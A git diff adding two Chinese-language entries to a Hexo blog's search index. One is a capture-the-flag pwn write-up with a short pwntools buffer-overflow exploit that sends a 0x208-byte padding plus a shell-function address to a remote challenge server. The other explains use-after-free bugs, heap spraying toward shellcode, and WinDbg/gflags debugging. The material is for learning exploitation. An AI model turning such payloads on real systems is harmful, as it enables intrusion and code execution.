@@ -42,6 +42,25 @@
   
   
   <entry>
+    <title>攻防世界-pwn-反应釜开关控制</title>
+    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/"/>
+    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/</url>
+    
+    <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h2><p><img src="https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png" alt="checksec.PNG"></p><ul><li>可以修改GOT表</li><li>可以通过一处的方式来更改程序运行流</li><li>堆栈不可执行</li><li>地址随机化未开启</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA查看，发现有/bin/sh。</p><p><img src="https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png" alt="shell.PNG"></p><p>get函数可溢出，偏移由v5得0x200h+0x8h(偏移对齐)=0x208h</p><p><img src="https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png" alt="v5.PNG"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp:</p><p><code> from pwn import * r = remote('220.249.52.133',39331) elf = ELF('./control') shell_addr = 0x04005F6 payload = 'A'*0x208 + p64(shell_addr) r.sendline(payload) r.interactive()</code></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了一下大佬的wp，结果原来是盲打题……</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>初识Meterpreter</title>
     <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/"/>
     <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/</url>
@@ -72,6 +91,25 @@
     <tags>
       
       <tag>环境搭建</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>UAF漏洞简单学习</title>
+    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
+    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
+    
+    <content type="html"><![CDATA[<p>UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>uaf漏洞成因：一块堆内存被释放之后又被使用。<br>再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。</p><p>由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。</p><h2 id="分析方式"><a href="#分析方式" class="headerlink" title="分析方式"></a>分析方式</h2><p>分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。</p><p>uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。</p><p>而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。</p><blockquote><p>1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。</p><p>2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。</p></blockquote><p>常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode</p><h2 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h2><p>对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具）</p><p><code>gflags.exe /i 程序名.exe +hpa +ust</code></p><p>这样调试器会定位到最先出错的位置。</p><blockquote><p>技巧：<br>1.在ida中查找函数后，在windbg下断<br>2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址<br>3.对对象起始使用 <code>!heap -p -a 地址</code> 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。<br>4.对分配函数下断到达分配现场<br>5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。</p></blockquote>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>chrome</tag>
       
     </tags>
     
